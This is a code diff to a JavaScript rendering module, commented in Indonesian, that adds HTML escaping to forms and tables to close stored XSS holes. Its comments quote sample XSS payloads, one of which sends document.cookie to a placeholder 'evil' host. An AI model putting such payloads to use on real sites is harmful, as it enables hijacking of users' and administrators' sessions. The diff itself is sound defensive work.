@@ -296,6 +296,25 @@ const web = {
 };
 
 // ============================================================
+// [SECURITY] Escaping HTML terpusat.
+// ------------------------------------------------------------
+// engine.js merender banyak nilai yang BERASAL DARI INPUT PENGGUNA
+// (judul artikel, nama CMS, dsb — lihat pages/*.js) langsung lewat
+// template string. Kalau nilai itu ditaruh ke DOM tanpa di-escape,
+// isi seperti `<img src=x onerror=alert(1)>` akan DIEKSEKUSI sebagai
+// HTML, bukan ditampilkan sebagai teks — ini yang disebut stored XSS.
+// Semua tempat di file ini yang merender nilai dinamis WAJIB lewat
+// escHtml() (untuk teks/isi tag) kecuali nilai tsb memang dimaksudkan
+// sebagai HTML mentah dan sudah dikontrol oleh developer (mis. kolom
+// "aksi" pada tabel — lihat renderTable().rawKeys di bawah).
+// ============================================================
+function escHtml(s) {
+    return String(s ?? '').replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
+    }[c]));
+}
+
+// ============================================================
 // COMPONENTS — komponen render (identik pola-nya dengan versi MOOC)
 // ============================================================
 const components = {
@@ -383,10 +402,24 @@ const components = {
      *  di style.css (lihat .form-drawer-body .dynamic-form / .a-row / .a-label). */
     genericForm: (ctx) => {
         const fields = (ctx.fields || []).map(f => {
+            // Field tipe 'raw' dipakai untuk menyisip HTML yang HARUS berada di
+            // dalam <form> (mis. widget captcha Turnstile — token responsnya
+            // ditaruh sebagai hidden input di dalam form terdekat, jadi kalau
+            // widgetnya ditaruh di luar <form>, form.querySelector(...) di JS
+            // tidak akan pernah menemukan tokennya). Isinya HARUS HTML yang
+            // sudah dirakit/dipercaya oleh developer, BUKAN nilai dari pengguna.
+            if (f.type === 'raw') return f.html || '';
+
             const fid  = f.id ? `id="${f.id}"` : '';
-            const fval = f.value !== undefined && f.value !== null ? String(f.value) : '';
+            // [SECURITY] f.value SERING berasal dari data tersimpan yang
+            // aslinya diketik pengguna (mis. judul artikel di editor.js).
+            // Tanpa escHtml(), nilai seperti `"><script>...` bisa keluar
+            // dari atribut value="..." dan menyuntik HTML/JS baru ke form
+            // (stored XSS yang muncul lagi setiap kali form dibuka/diedit).
+            const fval = escHtml(f.value !== undefined && f.value !== null ? String(f.value) : '');
             const req  = f.required ? 'required' : '';
-            const ph   = f.placeholder ? `placeholder="${f.placeholder}"` : '';
+            const ph   = f.placeholder ? `placeholder="${escHtml(f.placeholder)}"` : '';
+            const maxlen = f.maxlength ? `maxlength="${Number(f.maxlength)}"` : '';
 
             if (f.type === 'hidden') return `<input type="hidden" ${fid} name="${f.name}" value="${fval}">`;
 
@@ -400,15 +433,16 @@ const components = {
                 const opts = (f.options || []).map(o => {
                     const v   = typeof o === 'object' ? o.value : o;
                     const l   = typeof o === 'object' ? o.label : o;
-                    const sel = String(fval) === String(v) ? 'selected' : '';
-                    return `<option value="${v}" ${sel}>${l}</option>`;
+                    const sel = String(fval) === escHtml(String(v)) ? 'selected' : '';
+                    return `<option value="${escHtml(v)}" ${sel}>${escHtml(l)}</option>`;
                 }).join('');
                 input = `<select ${fid} ${fname} ${req}><option value="">— pilih —</option>${opts}</select>`;
             } else if (f.type === 'textarea') {
-                input = `<textarea ${fid} ${fname} rows="${f.rows || 3}" ${ph} ${req}>${fval}</textarea>`;
+                input = `<textarea ${fid} ${fname} rows="${f.rows || 3}" ${ph} ${req} ${maxlen}>${fval}</textarea>`;
             } else {
                 const step = f.type === 'number' ? `step="${f.step || 'any'}"` : '';
-                input = `<input type="${f.type || 'text'}" ${fid} ${fname} value="${fval}" ${ph} ${req} ${step}>`;
+                const auto = f.autocomplete ? `autocomplete="${escHtml(f.autocomplete)}"` : '';
+                input = `<input type="${f.type || 'text'}" ${fid} ${fname} value="${fval}" ${ph} ${req} ${step} ${maxlen} ${auto}>`;
             }
             return `<div class="a-row">${label}${input}</div>`;
         }).join('');
@@ -525,16 +559,36 @@ const components = {
             </div>`;
     },
 
-    /** Tabel generik — baris bisa berisi HTML mentah (mis. kolom "Aksi" dengan tombol Edit/Hapus). */
+    /**
+     * Tabel generik. Sel di-ESCAPE SECARA DEFAULT karena baris tabel di
+     * seluruh app ini (lihat pages/cms.js, pages/postingan.js) berisi
+     * data yang berasal dari input pengguna (nama CMS, judul artikel,
+     * dst). Tanpa escaping, mis. sebuah CMS didaftarkan dengan nama
+     * `<img src=x onerror=fetch('https://evil/x?c='+document.cookie)>`
+     * akan DIEKSEKUSI di browser SIAPA PUN yang membuka tabel itu —
+     * termasuk superadmin di halaman "Kelola CMS" (pages/cms.js), yang
+     * sesinya paling berkuasa di aplikasi ini. Itu stored XSS yang
+     * berujung pengambilalihan akun berprivilise tinggi.
+     *
+     * [SECURITY] Kolom yang MEMANG sengaja berisi HTML rakitan developer
+     * sendiri (mis. kolom "aksi" berisi tombol Edit/Hapus) harus didaftar
+     * eksplisit lewat opts.rawKeys — HANYA kolom itu yang dilewatkan
+     * tanpa escaping. Jangan pernah menaruh nilai milik pengguna ke
+     * dalam kolom yang ada di rawKeys.
+     */
     renderTable: (dataTable, opts = {}) => {
         if (!dataTable?.length) return '';
         const allKeys  = Object.keys(dataTable[0]);
         const hidden   = new Set(opts.hiddenKeys || []);
         const keys     = opts.visibleKeys ? opts.visibleKeys.filter(k => !hidden.has(k)) : allKeys.filter(k => !hidden.has(k));
         const labels   = opts.labels || {};
+        const rawKeys  = new Set(opts.rawKeys || []);
 
-        const head = keys.map(k => `<th>${labels[k] || k.toUpperCase()}</th>`).join('');
-        const body = dataTable.map(row => `<tr>${keys.map(k => `<td>${row[k] ?? ''}</td>`).join('')}</tr>`).join('')
+        const head = keys.map(k => `<th>${escHtml(labels[k] || k.toUpperCase())}</th>`).join('');
+        const body = dataTable.map(row => `<tr>${keys.map(k => {
+            const val = row[k] ?? '';
+            return `<td>${rawKeys.has(k) ? val : escHtml(val)}</td>`;
+        }).join('')}</tr>`).join('')
             || `<tr><td colspan="${keys.length}" style="text-align:center;color:var(--aColor)">Tidak ada data.</td></tr>`;
 
         return `<div class="table-container"><table>
